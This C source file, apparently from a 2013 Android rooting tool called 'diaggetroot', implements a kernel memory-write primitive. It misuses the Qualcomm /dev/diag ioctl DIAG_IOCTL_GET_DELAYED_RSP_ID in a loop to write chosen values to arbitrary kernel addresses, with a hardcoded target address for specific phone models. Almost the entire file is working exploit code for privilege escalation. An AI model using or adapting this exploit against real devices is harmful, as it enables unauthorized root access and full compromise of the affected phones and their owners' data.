/*
 * Copyright (c) 2013 Hiroyuki Ikezoe
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR(S) ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR(S) BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
/*
 * Based on htcj_butterflay_diaggetroot.zip
 * <https://docs.google.com/file/d/0B8LDObFOpzZqQzducmxjRExXNnM/edit?pli=1>
 */
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/system_properties.h>
#include <fcntl.h>
#include <stdarg.h>

#define  LOG_TAG    "diaggetroot"
#define  LOGI(...)  __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define  LOGD(...)  __android_log_print(ANDROID_LOG_DEBUG,LOG_TAG,__VA_ARGS__)
#define  LOGE(...)  __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)

#include <android/log.h>

//#define DELAYED_RSP_ID_ADDRESS 0xc0b8840c; // Xperia SX 113
#define DELAYED_RSP_ID_ADDRESS 0xc0cb0938; // SC-05D

#define DIAG_IOCTL_GET_DELAYED_RSP_ID   8
struct diagpkt_delay_params {
  void *rsp_ptr;
  int size;
  int *num_bytes_ptr;
};

static int
inject_value (void *adr, int value, int fd)
{
  uint16_t ptr;
  int i;
  int num;
  int ret;
  struct diagpkt_delay_params params;

  ptr = 0;
  params.rsp_ptr = &ptr;
  params.size = 2;
  params.num_bytes_ptr = (void*)DELAYED_RSP_ID_ADDRESS;
  ret = ioctl(fd, DIAG_IOCTL_GET_DELAYED_RSP_ID, &params);
  if (ret < 0) {
    LOGD("failed to ioctl\n");
    return ret;
  }

  ptr = 0;
  params.rsp_ptr = &ptr;
  params.size = 2;
  params.num_bytes_ptr = &num;

  ret = ioctl(fd, DIAG_IOCTL_GET_DELAYED_RSP_ID, &params);
  if (ret < 0) {
    LOGD("failed to ioctl\n");
    return ret;
  }

  ptr = (value - ptr) & 0xffff;
  LOGD("loop = %x\n", ptr);
  printf("loop = %x\n", ptr);

  params.size = 2;
  for (i = 0; i < ptr; i++) {
    params.rsp_ptr = adr;
    params.num_bytes_ptr = &num;
    ret = ioctl(fd, DIAG_IOCTL_GET_DELAYED_RSP_ID, &params);
    if (ret < 0) {
      LOGD("failed to ioctl\n");
      return ret;
    }
  }
  return 0;
}

int
inject (void *adr, int value, int fd)
{
  static int fd2;
  if (fd == 0) {
    if (fd2 == 0) {
      fd2 = open("/dev/diag", O_RDWR);
    }
    fd = fd2;
  }
  if (fd < 0) {
    LOGE("fd=%d", fd);
    return -1;
  }
  return inject_value(adr, value, fd);
}

/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
